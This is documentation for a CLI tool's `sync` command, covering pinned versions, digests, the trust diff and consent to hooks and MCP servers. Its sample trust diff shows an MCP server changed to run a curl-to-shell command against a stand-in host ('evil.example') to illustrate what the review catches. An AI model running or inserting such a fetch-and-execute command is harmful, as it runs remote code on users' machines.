# Sync, pins and trust

`lola sync` makes a project match its `.lola/project.yml` (with `--user`, your user scope match
your default profile (`$XDG_CONFIG_HOME/lola/profiles/default.yml`, user scope's base); [Choosing a scope](choosing-what-to-install.md#choosing-a-scope) says which scope
a run without a flag acts on), the way a teammate who cloned your repository gets what you
installed:

```
git clone https://example.com/acme/api.git && cd api
lola sync                    # shows what project.yml asks for, asks, installs it
lola sync                    # already in sync
lola sync review-kit         # only review-kit
lola sync --update           # fetch every module's ref again and re-pin it
lola sync --update lint-pack # only lint-pack
```

It installs every entry at the version its **pin** names (`commit` and `digest`, written by
`lola install` and by sync itself; see **Pins** in [Sources and the cache](../usage.md#sources-and-the-cache)), renders the modules
already installed, and removes what the manifest no longer lists: a whole module, or the targets
an entry no longer names. The files lola wrote that a version the run installs no longer ships (a
component a new pin or a re-read folder dropped or renamed) are removals too. Every removal is
listed first and asked about once; off a terminal `-y` confirms them.

A pinned version comes from your cache when it is there; otherwise a git
module is fetched by its commit, which must be reachable from the entry's `ref`, and an archive is
fetched again; either way its content must have the pinned digest. When it does not, sync stops:
`if you expect the change, re-pin it: lola sync --project --update <module>`.

Like every sync
hint, it names the run's scope: `--project` for the project found from where you are, `-C <dir>`
for another, `--user` at user scope. A moved tag or a force-pushed branch never changes what sync
installs, nor does `lola cache update`.

When a force-push removed the pinned commit from its ref
and your cache does not hold it, sync stops: `commit <sha> is not on <ref> at <source>`, with the
hint `re-pin to what <ref> serves: lola sync … --update <module>`. `lola update` and
`lola sync --update` take a force-pushed head like any other new version, after the trust question.

A teammate's sync installs the components `project.yml` and the project's profiles pick, not
yours: the picks you save for a `project.yml` module (`--only`, `--skip`, the component page) are
personal, kept in your `selections.yaml` under the project's repository, so they follow you to
every clone of it but never to a teammate. To share picks, put the module in a project profile
(`lola profile --move <module> --to project:<name>`), whose entries are committed with the project
([`config.yaml` and `selections.yaml`](choosing-what-to-install.md#configyaml-and-selectionsyaml)).

```mermaid
%%{init: {'theme': 'base', 'themeVariables': {
  'primaryColor': '#2f6dab',
  'primaryTextColor': '#1e1e1e',
  'primaryBorderColor': '#7c8ba1',
  'lineColor': '#7c8ba1',
  'edgeLabelBackground': '#eef2f8',
  'tertiaryColor': 'transparent',
  'tertiaryTextColor': '#7c8ba1',
  'tertiaryBorderColor': '#7c8ba1',
  'clusterBkg': 'transparent',
  'clusterBorder': '#7c8ba1',
  'titleColor': '#7c8ba1',
  'noteBkgColor': '#eef2f8',
  'noteTextColor': '#1e1e1e',
  'fontFamily': 'system-ui, sans-serif'
}, 'themeCSS': '.node .nodeLabel{color:#ffffff!important;fill:#ffffff!important;}'}}%%
flowchart TD
  Pin["entry's pin: commit and digest"] --> Cached{in your cache?}
  Cached -->|yes| Digest{content has the pinned digest?}
  Cached -->|"no, git"| Git["fetch the commit, which must be reachable from the ref"]
  Cached -->|"no, archive"| Archive[fetch the archive again]
  Git --> Digest
  Archive --> Digest
  Digest -->|yes| Install[install it]
  Digest -->|no| Stop["sync stops: re-pin it with --update"]
  classDef sysA fill:#2f6dab,color:#ffffff,stroke:#7c8ba1
  classDef sysB fill:#1d7848,color:#ffffff,stroke:#7c8ba1
  classDef sysF fill:#5c6a82,color:#ffffff,stroke:#7c8ba1
  class Pin,Git,Archive sysA
  class Install sysB
  class Stop sysF
```

- **Names limit a run.**
  - `lola sync a b` validates, checks, fetches, asks about and records only `a` and `b`: an entry
    you did not name is never fetched or asked about, so a broken or untrusted one cannot block
    the one you named.
  - A name must be an entry of the manifest or a module installed here that it no longer lists
    (which the run removes, after asking). Any other name is refused before anything else, with
    both lists in the hint.
  - The top-level `targets` are asked about only when a named entry has no `targets` of its own.
  - A limited run says `a, b already in sync` when it has nothing to do.
  - It also lists the modules outside the run that are not in sync: `2 other modules are not in
    sync: c, d → lola sync`. It finds them without fetching, by comparing `project.yml` with
    `lock.json` (the record of what is installed): an entry not installed, an entry whose pin
    differs from the version installed, and a module installed that `project.yml` no longer
    lists.
  - That local check misses what only a full sync finds: an unpinned entry's new version, a
    changed source, ref or path whose content is the same, and changed top-level `targets`.
- **Unpinned entries.** A git or archive entry without a `digest` installs your cache's newest
  version for its ref (fetching the ref when the cache has none), and sync writes that pin into
  `project.yml`. Folder entries are never pinned: sync reads the folder on every run, and
  `--update` writes no pin for one.
- **`--update`** fetches the refs of the run's entries again (every entry, or the ones named) and
  re-pins them.
  - An entry installed through a [marketplace](marketplaces.md#marketplaces) (`market:`) follows
    that marketplace's catalog instead, fetched once per run, and only within the same source,
    path and ref: the catalog's commit pin becomes the new pin (checked against the ref, as at
    install).
  - The entry re-pins from its own source and ref instead when the catalog moved it to another
    ref, source, path or selection, or no longer lists it, or you have no marketplace of that
    name from the source the entry records. A notice says why:
    - a changed ref, with `lola install @acme/<entry>` (a changed source or ref is an install,
      never a sync);
    - a changed source, path or selection, with what to do first, as your cache holds one module
      of a name (uninstall it and remove it from your cache, then install the address).
  - A catalog that cannot be fetched is a warning, and its entries re-pin from their own sources.
  - `lola sync` without `--update` never reads a catalog, and `--update` fetches one only for
    entries you trusted before the run. A pulled `project.yml` requests its catalog only once you
    trust it; meanwhile its entries re-pin from their own sources, saying so, with the
    `lola sync --update` that follows the catalog next (a dry run, which records no trust, names
    none).

  ```mermaid
  %%{init: {'theme': 'base', 'themeVariables': {
    'primaryColor': '#2f6dab',
    'primaryTextColor': '#1e1e1e',
    'primaryBorderColor': '#7c8ba1',
    'lineColor': '#7c8ba1',
    'edgeLabelBackground': '#eef2f8',
    'tertiaryColor': 'transparent',
    'tertiaryTextColor': '#7c8ba1',
    'tertiaryBorderColor': '#7c8ba1',
    'clusterBkg': 'transparent',
    'clusterBorder': '#7c8ba1',
    'titleColor': '#7c8ba1',
    'noteBkgColor': '#eef2f8',
    'noteTextColor': '#1e1e1e',
    'fontFamily': 'system-ui, sans-serif'
  }, 'themeCSS': '.node .nodeLabel{color:#ffffff!important;fill:#ffffff!important;}'}}%%
  flowchart TD
    Entry[entry of an --update run] --> Market{"installed through a marketplace (market:)?"}
    Market -->|no| Own[fetch its ref again and re-pin]
    Market -->|yes| Trusted{trusted before the run?}
    Trusted -->|no| Notice["re-pin from its own source and ref, with a notice"]
    Trusted -->|yes| Known{you have that marketplace from the entry's source?}
    Known -->|no| Notice
    Known -->|yes| Fetched{catalog fetched?}
    Fetched -->|no| Warn["warning; re-pin from its own source and ref"]
    Fetched -->|yes| Same{"catalog lists it at the same source, path, ref and selection?"}
    Same -->|yes| Catalog[the catalog's commit pin becomes the new pin]
    Same -->|no| Notice
    classDef sysA fill:#2f6dab,color:#ffffff,stroke:#7c8ba1
    classDef sysB fill:#1d7848,color:#ffffff,stroke:#7c8ba1
    classDef sysF fill:#5c6a82,color:#ffffff,stroke:#7c8ba1
    class Entry sysA
    class Own,Catalog sysB
    class Notice,Warn sysF
  ```
- **Removals**
  - are listed with every file lola wrote for them, one per line;
  - are confirmed on a terminal with the question `Remove these and sync? No applies nothing`
    (default No): a No applies none of the sync, not only none of the removals;
  - are confirmed by `-y`, never by `--trust`.
  - `lock.json` is not trusted input either. A recorded path that climbs out of its target's root
    (`../`, an absolute path), or a target lola does not know, is refused by every command that
    plans from the file, before anything is planned, asked or written. lola never records such an entry itself,
    so it was edited, damaged or copied from elsewhere.
    - The refusal names `lock.json`, the module and the path or target, and hints
      [`lola repair`](../reference/repair.md#lola-repair) for the scope, with your run's scope and output
      flags (`lola repair --project`).
    - `lola repair` lists every such entry, asks, and forgets them; it deletes and moves no file.
      `lola sync --project` then puts back any file a module now lacks.
    - Do not delete the whole `lock.json`: it also holds the profile you have on and the versions
      installed, which trust of folder modules compares, and every file lola wrote would then
      count as not written by lola.
  - A recorded path that leaves its root through a symbolic link is removed where the link leads;
    the plan shows it as `<path> (via symlink → <resolved path>)`, as for `lola uninstall`.
- **Already in sync.** A second run writes nothing, prints its findings and notices, and says
  `✓ already in sync`.
- **Missing commit.** A cached git head recorded without a commit (written before pins) is
  fetched again at its ref, never refused.
- **Output.**
  - The plan, the MCP servers of the modules the diff did not show, the hooks, the pins (each
    once, with its new digest), the removals, the findings and the notices.
  - Then a `✓ synced <module>` line for each module the run changed, `✓ removed <module>`, and
    `✓ N unchanged` for the rest.
  - A dry run's plan lists at most 40 steps a module, then
    `… and N more for <module> (lola sync -n --json lists them all)` with your own names and
    flags (a file list's says `… and N more (…)`, without the module).
  - A dry run ends with the command that applies it, `→ to apply: lola sync review-kit`, and, when
    that needs consent, the form for no terminal:
    `→ off a terminal: lola sync review-kit --trust=entries`.
    - It carries your own names and
      flags, `-y` only when you gave it, and `--trust=` the kinds you gave and the kinds the run
      would be refused without: `entries`, `profiles`, `hooks` for a module's pre-install hook
      without your consent, and `scripts` for a project's pre-install script without it.
    - A run
      that removes something asks first; off a terminal it is refused with the same command and
      `-y`.
- **One origin per source.** Your cache keeps a module by its name and the source it came from, so
  two checkouts or worktrees of one repository, or the same module name from two sources, each
  sync without touching the other's cache.
  - `lola install <name>`, `lola info <name>` and the other commands that name a module and no
    source use the source cached most recently; an entry in `project.yml` always uses its own.
  - A **moved project:** when a source your cache records for the name is a local folder or
    archive that no longer exists, and the entry's source is local too, sync says `<module>: your
    cache has it from <old>, which no longer exists; caching it from <new>` and drops the old
    record when you trust the new one (lola checks again, under the cache's lock, that the old
    place is still gone; a dry run replaces nothing).
    - `lola install` of a local source does the same.
    - A folder that is only missing for a while (an unmounted drive) is replaced too; you
      see the notice and the trust diff.
  - `lola cache rm <name>` removes every source's copy of the module.

**The trust diff.** At project scope, sync compares `project.yml`, with the pins it would write,
to what you last trusted (`$XDG_STATE_HOME/lola/trust.json`): what lola wrote there, or what you
accepted in an earlier sync. Any difference is shown before anything is cached or installed, with
the content each changed entry brings:

```
.lola/project.yml changed since lola last wrote it or you last trusted it:
  ! review-kit    source host changed: https://github.com/acme/review-kit.git → https://git.example.net/acme/review-kit.git
  ~ docs-kit      ref v1 → v2 (content not fixed; installs what v2 serves now)
                  digest sha256:9b0c7d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c8d9e0f1a2b3c4d5e6f7a8b9c
                       → sha256:1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c8d9e0f1a2b
      files: 1 changed, 1 removed
        ~ skills/docs/SKILL.md
        - commands/old.md
      MCP server search (stdio), changed: runs sh -c "curl https://evil.example/x | sh"
                                    was: runs npx -y @acme/search-mcp
      MCP server github (http), unchanged
  + lint-pack     https://github.com/acme/lint-pack.git  ref v2
                  commit 4f1c2d3e5a6b7c8d9e0f1a2b3c4d5e6f7a8b9c0d
                  digest sha256:3f2a9c1b7d4e5f60718293a4b5c6d7e8f9a0b1c2d3e4f5061728394a5b6c7d8e
      files: 2 added
        + commands/fix.md
        + skills/lint/SKILL.md
      MCP server github (stdio), added: runs npx -y @acme/github-mcp
        env: GITHUB_TOKEN=${GITHUB_TOKEN}
      install hook post-install, added: scripts/setup.sh
  - old-mod
  ~ targets       [claude-code] → [claude-code, opencode]
```

An entry's [vars](templating.md#vars) are trusted with it: a vars-only edit is a change, listed as `vars`.

The header names the cause: `has not been trusted on this machine (a fresh clone, or a moved
project):` for a project with no record (its targets row reads `+ targets [claude-code]`),
`changed since lola last wrote it or you last trusted it:` when the manifest changed, and
`is unchanged; lola sync needs your trust for:` when only the pins sync would write or a folder's
content need your trust; each such entry says why: `re-pin from v1 (--update)`,
`pin what v1 serves now`, `content changed since lola installed it`, or, as an addition, `not
installed yet` for a folder you trusted that lola has not installed (after a No to the removals).

`!` marks a source that moved to another host, scheme, or between your disk and the network; a
change to or from the `host:path` form always counts, since it may name a folder. A note on an
entry whose manifest does not pin its content says what it installs: for a git entry its ref (or
`the default branch`), for an archive `installs what <file or URL> serves now`. Commits and
digests are printed in full, the old value on the field's line and `→ new` under it.

The files
are compared with the version installed, from your cache: counts, then one path per line,
changed and removed before added, at most 20 per module, then
`… and N more (lola sync -n --json lists them all)`, with your own names and flags
(`lola sync big --update -n --json`); lola's own generated `lola.yml` is listed
only when it changed or went. When your cache no longer has the version installed, or cannot read
it, every file is listed as added with a note saying why (lola never fetches the old version to
compare).

Each MCP server and hook is marked `added`, `changed`, `unchanged` or `removed` against
the version installed: an MCP server shows what it runs, with every argument that is not a plain
word in quotes (`sh -c "curl x|sh"` is three words), or where it `connects to`, then its `env`,
`header` and `cwd` lines, and a changed one adds a `was:` line under each part that differs; an
unchanged one takes one line. A hook is identified by all of its fields, so a hook whose command
changed is one `removed` and one `added`.

Every hook the content declares is listed: install
hooks, runtime hooks and an agent's own hooks and MCP servers, whatever assistants the entry
installs for and whichever components you deselected. By accepting the diff you consent to the
module MCP servers it lists.

**The trust question.** On a terminal, after the diff:

```mermaid
%%{init: {'theme': 'base', 'themeVariables': {
  'primaryColor': '#2f6dab',
  'primaryTextColor': '#1e1e1e',
  'primaryBorderColor': '#7c8ba1',
  'lineColor': '#7c8ba1',
  'edgeLabelBackground': '#eef2f8',
  'tertiaryColor': 'transparent',
  'tertiaryTextColor': '#7c8ba1',
  'tertiaryBorderColor': '#7c8ba1',
  'clusterBkg': 'transparent',
  'clusterBorder': '#7c8ba1',
  'titleColor': '#7c8ba1',
  'noteBkgColor': '#eef2f8',
  'noteTextColor': '#1e1e1e',
  'fontFamily': 'system-ui, sans-serif'
}, 'themeCSS': '.node .nodeLabel{color:#ffffff!important;fill:#ffffff!important;}'}}%%
flowchart TD
  Diff[trust diff] --> Q{Trust these changes?}
  Q -->|Trust all| All[every change is trusted]
  Q -->|Choose…| Pick[one multi-select per kind of change]
  Q -->|"Cancel (default)"| Abort[the project is not changed]
  Pick -->|nothing chosen| Abort
  Pick -->|some chosen| Some[entries you did not trust stay as installed]
  All --> Removals["removals, if any, are asked"]
  Some --> Removals
  Removals -->|"confirmed, or none"| Apply["apply, then record the trust"]
  classDef sysA fill:#2f6dab,color:#ffffff,stroke:#7c8ba1
  classDef sysB fill:#1d7848,color:#ffffff,stroke:#7c8ba1
  classDef sysF fill:#5c6a82,color:#ffffff,stroke:#7c8ba1
  class Diff sysA
  class Apply sysB
  class Abort sysF
```

```
┃ Trust these changes?
┃   Trust all 4 changes
┃   Choose…
┃ > Cancel (the project is not changed)
```

It counts the diff's rows, the top-level `targets` row included; for a single change the first
answer reads `Trust this change`. Cancel is under the cursor, so
Enter alone changes nothing. *Choose…* opens filterable
multi-selects, one per kind of change, in the diff's order, with nothing preselected, since trust
is your consent: each option reads like `~ docs-kit ref v1 → v2; MCP server search changed`, and
`- old-mod stop managing it and remove its files`. Choosing nothing cancels. lola prints your
answer (`→ trusting review-kit, lint-pack; leaving docs-kit as installed`) and plans the entries
you trusted again from what it already fetched, so what it applies is what it showed:

- an entry you did not trust stays as installed: a changed one at the version installed, an added
  one not installed, a removed one still installed. Its content never enters your cache, it gets
  no pin, its hooks are neither asked about nor run, and its record in `trust.json` stays as it
  was, so the next sync asks about it again (lola remembers no answer). The result says
  `left as installed until you trust them: docs-kit → lola sync --project`;
- the top-level `targets` have no option of their own: *Trust all* accepts them, and so does an
  accepted added or changed entry that has no `targets` of its own (its option says
  `accepts the top-level targets [claude-code] → [claude-code, opencode]`, or
  `accepts the top-level targets [claude-code]` when there were none), since it installs to them;
  a removed entry never does. When they are not accepted, every entry that installs to them stays as installed too. When
  they are the only change, the question offers only Trust all and Cancel;
- once the removals, if any, are answered, lola prints the command that does the same off a
  terminal: after *Trust all*, your own run with `--trust=` the kinds of the changes; after
  *Choose…*, one naming every entry you trusted (even one whose change only the record holds,
  such as a new `ref` at the same commit) and every module the run changed:
  `→ the same off a terminal: lola sync lint-pack review-kit --trust=entries` (with `-y` when
  you confirmed removals; nothing after a No).

`--trust <module>…` is that answer as a flag: in a run limited to those modules, `--trust`
accepts every change of the run. A module named like a kind of trust (`hooks`, say) is refused
right after a bare `--trust`: write the module name before `--trust`, or after `--`.

- The record is written once the sync has applied, so a failure asks again next time. Cancel or
  Ctrl+C prints `aborted; the project was not changed.` (your cache may already hold versions you
  trusted before). In accessible mode (`LOLA_ACCESSIBLE=1`), Ctrl+C at any question cancels the
  same way, with exit 0.
- **A No to the removals** applies nothing.
  - It records the trust you just gave (only when it changed what the record holds), without the
    pins lola did not write, and says what the next sync asks again: `removals declined; the
    project was not changed. The changes you trusted are recorded; the next lola sync asks only
    about the removals.`
  - lola records a pin it would write, or a folder's content, only once it writes it, so for
    those entries the message says `the next lola sync asks about the removals and about
    <module>, … again: lola records a pin or a folder's content only once it writes it.` (and
    leaves out `The changes you trusted are recorded` when they were all such changes).
  - When a sync of the modules you trusted would install them without removing anything, the
    message ends with that command, for example `lola sync --project lint-pack installs what you
    trusted without removing anything.`
- **`--trust`** takes [kinds](choosing-what-to-install.md#trust-kinds): `entries` answers for
  `project.yml`, `profiles` for its project profiles, `scripts` for the project's install
  scripts, `hooks` for modules' install hooks and `runtime-hooks` for their Claude Code runtime
  hooks and agent MCP servers; `all` is every kind, and bare `--trust` is `entries,profiles`.
  - It prints the diff it accepted on stderr, then the receipt of everything its kinds cover
    (`trusting, as --trust=entries allows:`).
  - On a terminal it asks `Proceed?` once (`-y` answers; No installs and records nothing, and
    leaves your cache as it was, as every refusal does). Off a terminal it goes on, and under `--json` it prints
    neither (`trust` and `trusted` hold them).
  - `--scope both` asks one receipt for both scopes and applies neither before its yes.
- **A run without the answers it needs** is refused once, before it fetches anything a pull
  asked for, naming every one: `lola sync needs your trust for changes to .lola/project.yml; and
  your confirmation to remove old-mod, and there is no terminal to ask on`.
  - On stderr: the diff (fields only for git and archive entries a pull added or changed, which
    are not fetched; each entry it would pin by name; and a new or changed folder with its
    content, read from your disk) and the removals.
  - An entry your trust record covers that the run would pin (an `--update` or `lola update` of
    a module you installed) is fetched first, into the run's private staging and never into your
    cache, so the diff shows its new pin and files, and the files it drops (as your picks would
    install it) are listed as removals in the same refusal. One that finds nothing new needs no
    trust and is not refused.
  - The accept hint carries `-y` only when every removal it would confirm is listed. An entry a
    pull changed is not fetched yet, so while one is installed the hint has no `-y`; the run it
    hints fetches it, lists every removal and asks for `-y` then.
  - The hints `see them: lola sync --project -n` and `then accept them: lola sync --project
    --trust=entries -y`, with your other flags and `--trust=` exactly the kinds missing beside
    those you gave; each keeps the run's `--json`, `--plain` and `--no-pager`. The accept hint
    adds `--at <module>=<version>` for each new version the diff showed, so it installs only
    what you saw ([`--at`](../reference/sync.md#lola-sync)).
  - `-y` confirms removals only, which the error says when you gave it (`…; -y confirms removals
    only; accept them with --trust=entries`).
  - `--trust` alone with removals hints `then confirm them: lola sync --project
    --trust=entries,profiles -y`.
  - A refusal of removals alone adds `--trust=hooks` when a pre-install hook without your
    consent would refuse the next run.
- A pin sync writes is a change you trust, even for an entry you trusted before: re-pinning
  with `--update`, and writing back the pin of an unpinned entry, need your answer or `--trust`.
- Neither an answer, bare `--trust` nor `-y` consents to install hooks, runtime hooks or an agent's
  MCP servers: lola still asks for each, or takes `--trust=hooks` and `--trust=runtime-hooks`.
  Every kind's grant is recorded as a yes at the prompt is, once the receipt is answered, so a
  later run with the same digests asks nothing. On a CI machine whose `$XDG_STATE_HOME`
  persists between jobs, one job's `--trust=hooks` covers the next job that installs the same
  hooks; run each job with a fresh `XDG_STATE_HOME` for consent per job.
- **Project scripts.** A project's `pre_install:` and `post_install:` in `project.yml` run your
  teammates' code around every module copy a sync installs ([Install
  scripts](choosing-what-to-install.md#install-scripts)).
  - They are not entries, so `--trust=entries` never covers them.
  - Each is consented per project, event and the script's sha256. A sync asks about a script it
    has no consent for even when it installs nothing, so a pulled `project.yml` that adds one, or
    a pulled edit of the script, asks before anything runs it.
  - Off a terminal an untrusted `pre_install` refuses: `lola sync needs your trust for the
    pre-install script ci/check.sh of this project (new), and there is no terminal to ask on`,
    hinting `lola info` of a module it installs, then your run with `--trust=scripts`.
  - An untrusted `post_install` is skipped with a warning and stays pending on the modules it
    would have wrapped; `lola sync <module> --trust=scripts` runs it alone in their copies.
  - A `--user` sync never runs a project's scripts.
- A project with no record in `trust.json` (a fresh clone, a moved directory, a deleted state
  directory) has every entry untrusted: the first sync shows them all and asks once. A manifest
  with no modules and no targets has nothing to trust.
- If lola cannot write `trust.json` after applying, the error says what was applied, and what it
  wrote stays untrusted: fix the file, then run `lola sync` again to review and trust it (the
  same for `install`, `uninstall` and `migrate`).
- User scope has no trust diff: `default.yml` and your other profiles are yours. The entries lola
  writes into a project profile (`install`, `uninstall`) are recorded as trusted, as `project.yml`'s
  are, and a project profile's top-level `targets:` is trust content: a change to it shows as a
  `~ targets` row under the profile and Trust all accepts it.
- A project bundle's member list is trust content: a pull that changes it (a member added, removed
  or reordered) shows `~ bundle  [review] → [review, lint]` under the bundle and is asked about as a
  profile's change (`--trust=profiles`); `-y` and `--force` never answer it. Until you trust it,
  what the changed list brings stays as installed. A remote member of a project bundle is restored
  from `pins.yaml` only once the member list is trusted, so a pulled bundle triggers no fetch
  before you have answered.
- A `trust.json` from before bundles, which recorded an entry's remote profile as `extends`, is
  refused whole, not read (only a project profile's entry that came from a remote profile it
  extended holds the field): `<trust.json>: it is in the trust format of a lola before bundles: the
  records of "/old/a" hold the field extends, which lola now records as member`.
  - The hint names the
    records to remove from `projects` in that file; lola then asks about those projects' modules
    again and keeps every other project's trust.
  - Renaming the field by hand does not work, because
    the record's hash covers it.

**Folder modules in the repository.** `project.yml` names a folder, not its content, so sync
trusts a folder's content by the version installed (`lock.json`). When a folder you trusted holds
something else (a pull changed the module, or you edited it), sync shows it as a change of its
digest with the files, MCP servers and hooks, and asks as for any other change.

The diff adds
`review the edits: git log -p -- mods/notes` when the folder is in a git work tree, and
`edited it yourself? lola install --project ./mods/notes`: installing it records the content as yours, so
editing your own module costs one question per sync, or that install. A checkout without
`lock.json` has no version installed, so sync asks about each folder module once.

**What update does.** `lola update` moves each installed module to the version its source holds
now at the ref `project.yml` records (the default branch when it records none; a tag or full SHA
stays put unless the tag itself moves; to follow another ref, `lola install <module> --ref <ref>`), fetching a ref only when `cache_fresh_for:` (`config.yaml`; `1d` unless it says otherwise,
whole days or weeks, `never` to fetch every run) has passed since it was last fetched, or when you
pass `--fetch`.

It installs and removes no module; the files a new version no longer ships are
listed and confirmed as removals are (`-y` off a terminal). Trust is sync's: a fresh head that
has not moved asks nothing, so within `cache_fresh_for` it works off a terminal without
`--trust`.

A stale head is fetched into the run's private staging before anything is asked, so
one that has not moved asks nothing either; one that moved is refused off a terminal without
`--trust`, once, with the files it drops and a hint that applies it in one run; in CI, pass
`--trust` with the kinds you accept (`--trust=entries` for pins). A pin that moved is
shown and asked about, or answered by `--trust`; `--force` never answers that question.

When it
served a ref from the cache it says how many modules, with your run and `--fetch`; it names the
entries listed but not installed, with the `lola sync` that installs them. It leaves a
module as installed (no files, copy or hooks touched), with a warning and its remedy, when:

| Code | Why | Hint |
|---|---|---|
| `not-in-manifest` | no layer lists it any more | `lola sync`, which would remove it |
| `targets-differ` | its entry asks for other assistants than are installed | `lola sync`, which applies the change |
| `fetch-failed` | its source could not be fetched | what the fetch says to fix, then `lola update <module> --fetch` |

An entry that comes from a remote profile is left too, with a notice to run `lola profile <name>
--update`. `lola update` fetches the rest and exits `1` when any fetch failed. To render again at
the installed versions without fetching anything, run `lola sync`: it refuses the whole run when it
cannot load an installed module, hinting `remove it: lola uninstall <name>`. When only your cache's
record of a module (its `index.yml`) does not read, it hints `lola cache rm <name>` and then your
run again, which fetches the module back.

**Local sources stay in the project.** A folder, local archive or `file://` source of an entry you
have not trusted must resolve, after symbolic links, inside the project root, and so must one you
installed from inside the project, so that a pulled symbolic link cannot lead it out. One that
leaves it is refused before the diff, and neither `--trust` nor `-y` overrides it:
`<module>: local source ../x resolves outside the project (/home/me/x)`, with the hint to install
it yourself if you trust it (`lola install /home/me/x`), which records the entry as trusted.

`lola install` warns when it writes such a source into `project.yml` (`<module> comes from
/home/me/x, outside the project: a teammate's sync will refuse it`), and records a `file://`
URL as the path it names. A source you installed or trusted outside the project is not checked
while its `source` and
`path` stay as you trusted them: a vars or targets edit of it is asked about, not refused. A
relative source is judged after joining it to the project, so `../<project>/x` counts as
inside and is checked. A project reached through a symbolic link is checked against its real
root.

**What a sync caches.** Content of entries you have not trusted is fetched into the run's
private directory and enters your cache only after you trust it. `-n` (dry run) shows the diff,
the plan and the removals on stdout, asks nothing and writes nothing to the project, the
manifest or `trust.json`; the content of trusted entries at their pins may still be fetched into
your cache, without moving any ref's cached head, and at user scope `--update -n` fetches into
your cache and moves the refs' cached heads, as `-n` may there.

**The viewer.** When both stdout and stderr are terminals and the output is human, `lola sync`
shows the trust diff, the removals it asks about and a dry run's diff and plan in full (output
printed without the viewer keeps its caps and `… and N more` lines). When that is taller than the
terminal it opens in lola's viewer ([Output contract](../usage.md#output-contract)), and the
question comes after you quit it; the diff is then printed, so it stays in your scrollback. Every
other command's output, and help, opens the same way.

A `$LOLA_PAGER` you set is used instead,
split on whitespace and run without a shell (`LESS=FRX` when `LESS` is unset; `cat` prints); lola
never runs a pager found in the current directory (a relative entry in `PATH`): it warns and
prints the diff instead, as it does when the pager is missing or fails. Ctrl+C belongs to the
pager while it runs.

`--no-pager`, a non-empty `NO_PAGER`, accessible mode (`LOLA_ACCESSIBLE=1`, `TERM=dumb`), or
`pager: false` in your `config.yaml` (never a project's) turns the viewer off; `--json`, `--plain` and output that is not a terminal never use
it. lola reads `pager` only when it could open the viewer; a malformed `pager` value is then a
warning, and the output is printed. Like any malformed key, it still fails a command that reads
`default_scope` (one without a scope flag).

**`lola install` without arguments** says how many modules `project.yml` (and any active
[profile](profiles.md#profiles); `default.yml` at user scope) lists that are not installed, on a terminal
before the module picker (`1 module in project.yml is not installed → lola sync --project`;
`2 modules in profile:default and profile:go are not installed → lola sync --user`), and off a
terminal as a hint of its missing-argument error (`install what project.yml lists: lola sync
--project`). `lola install <module>` writes the file [your edits go to](profiles.md#where-your-edits-go);
when a higher layer lists the module with another entry, that entry keeps winning and the install
says so (`gopls: profile go's entry wins; this change to default (base) applies when it is off`).

## Syncing lola between machines

How to keep lola's state in step across machines. It has its own page: [Syncing lola between machines](syncing-lola-between-machines.md).
